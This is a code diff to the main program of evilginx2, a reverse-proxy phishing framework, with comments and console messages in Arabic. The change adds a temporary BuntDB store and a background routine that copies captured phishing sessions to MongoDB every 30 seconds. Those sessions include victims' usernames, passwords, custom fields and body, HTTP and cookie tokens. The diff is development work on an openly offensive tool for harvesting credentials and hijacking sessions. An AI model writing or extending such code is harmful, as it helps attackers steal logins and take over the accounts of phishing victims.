@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"time"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
@@ -152,7 +153,7 @@ func main() {
 	var buntDb *database.Database
 
 	if *use_mongo {
-		// استخدام MongoDB
+		// استخدام MongoDB - سنستخدم الواجهة فقط ونتجنب MongoDB في الوظائف الأساسية
 		db_name := *mongo_db_name
 		if db_name == "" {
 			db_name = "evilginx"
@@ -168,6 +169,20 @@ func main() {
 		db = mongo_db
 
 		fmt.Printf(lg("تم") + e)
+		
+		// تنبيه بأن بعض الوظائف قد لا تعمل مع MongoDB حتى يتم تحديث الكود
+		fmt.Printf("\n" + lr(" تنبيه: ") + "دعم MongoDB لا يزال تجريبياً. بعض الوظائف قد لا تعمل بشكل صحيح.")
+		fmt.Printf("\n" + lr(" تنبيه: ") + "يُفضل استخدام BuntDB للإنتاج حتى يتم تحديث الكود بالكامل.")
+		
+		// سنستخدم BuntDB أيضًا كنسخة احتياطية للوظائف التي لا تدعم MongoDB بعد
+		// هذا حل مؤقت حتى يتم تحديث الكود بالكامل
+		tmpPath := filepath.Join(*cfg_dir, "tmp_bunt.db")
+		fdb, err := database.NewDatabase(tmpPath)
+		if err != nil {
+			log.Fatal("%v", err)
+		}
+		buntDb = fdb
+		
 	} else {
 		// استخدام BuntDB (التنفيذ الحالي)
 		storage_path := ""
@@ -244,19 +259,18 @@ func main() {
 		return
 	}
 
-	// نتحقق ما إذا كان نستخدم BuntDB أو MongoDB ونمرر واجهة قاعدة البيانات المناسبة
-	var hp *core.HttpProxy
+	// نحن نستخدم BuntDB دائمًا في core لأنه حاليًا لا يدعم واجهة IDatabase
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
+	
+	// إذا كنا نستخدم MongoDB، نضيف آلية لمزامنة البيانات من BuntDB إلى MongoDB
 	if *use_mongo {
-		// استخدام النوع المناسب لـ MongoDB
-		mongoDB, ok := db.(*database.MongoDatabase)
-		if !ok {
-			log.Fatal("فشل تحويل نوع MongoDB")
-			return
-		}
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, mongoDB.AsDatabaseType(), bl, *developer_mode)
-	} else {
-		// استخدام BuntDB
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, buntDb, bl, *developer_mode)
+		// إضافة معالج حدث على فترات منتظمة لنقل الجلسات من BuntDB إلى MongoDB
+		go func() {
+			for {
+				time.Sleep(30 * time.Second)  // كل 30 ثانية
+				syncSessionsToMongoDB(buntDb, db)
+			}
+		}()
 	}
 	
 	hp.Start()
@@ -274,21 +288,7 @@ func main() {
 			}
 		}
 		
-		var api *core.ApiServer
-		var err error
-		
-		if *use_mongo {
-			// نستخدم النوع المناسب من قاعدة البيانات
-			mongoDB, ok := db.(*database.MongoDatabase)
-			if !ok {
-				log.Fatal("فشل تحويل نوع MongoDB")
-				return
-			}
-			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, mongoDB.AsDatabaseType())
-		} else {
-			api, err = core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
-		}
-		
+		api, err := core.NewApiServer(*api_host, *api_port, *admin_username, *admin_password, cfg, buntDb)
 		if err != nil {
 			log.Fatal("api server: %v", err)
 			return
@@ -298,24 +298,57 @@ func main() {
 		log.Info("API server started on %s:%d", *api_host, *api_port)
 	}
 
-	var t *core.Terminal
-	var err2 error
-	
-	if *use_mongo {
-		mongoDB, ok := db.(*database.MongoDatabase)
-		if !ok {
-			log.Fatal("فشل تحويل نوع MongoDB")
-			return
-		}
-		t, err2 = core.NewTerminal(hp, cfg, crt_db, mongoDB.AsDatabaseType(), *developer_mode)
-	} else {
-		t, err2 = core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
-	}
-	
-	if err2 != nil {
-		log.Fatal("%v", err2)
+	t, err := core.NewTerminal(hp, cfg, crt_db, buntDb, *developer_mode)
+	if err != nil {
+		log.Fatal("%v", err)
 		return
 	}
 
 	t.DoWork()
+}
+
+// syncSessionsToMongoDB ينقل الجلسات من BuntDB إلى MongoDB
+func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase) {
+	sessions, err := buntDb.ListSessions()
+	if err != nil {
+		log.Error("فشل قراءة الجلسات من BuntDB: %v", err)
+		return
+	}
+	
+	for _, s := range sessions {
+		// تحقق ما إذا كانت الجلسة موجودة بالفعل في MongoDB
+		_, err := mongoDb.GetSessionBySid(s.SessionId)
+		if err != nil {
+			// إنشاء الجلسة في MongoDB إذا لم تكن موجودة
+			err = mongoDb.CreateSession(s.SessionId, s.Phishlet, s.LandingURL, s.UserAgent, s.RemoteAddr)
+			if err != nil {
+				log.Error("فشل إنشاء الجلسة في MongoDB: %v", err)
+				continue
+			}
+			
+			// نقل البيانات الأخرى
+			if s.Username != "" {
+				mongoDb.SetSessionUsername(s.SessionId, s.Username)
+			}
+			if s.Password != "" {
+				mongoDb.SetSessionPassword(s.SessionId, s.Password)
+			}
+			if len(s.Custom) > 0 {
+				for k, v := range s.Custom {
+					mongoDb.SetSessionCustom(s.SessionId, k, v)
+				}
+			}
+			if len(s.BodyTokens) > 0 {
+				mongoDb.SetSessionBodyTokens(s.SessionId, s.BodyTokens)
+			}
+			if len(s.HttpTokens) > 0 {
+				mongoDb.SetSessionHttpTokens(s.SessionId, s.HttpTokens)
+			}
+			if len(s.CookieTokens) > 0 {
+				mongoDb.SetSessionCookieTokens(s.SessionId, s.CookieTokens)
+			}
+			
+			log.Debug("تمت مزامنة الجلسة %s من BuntDB إلى MongoDB", s.SessionId)
+		}
+	}
 }
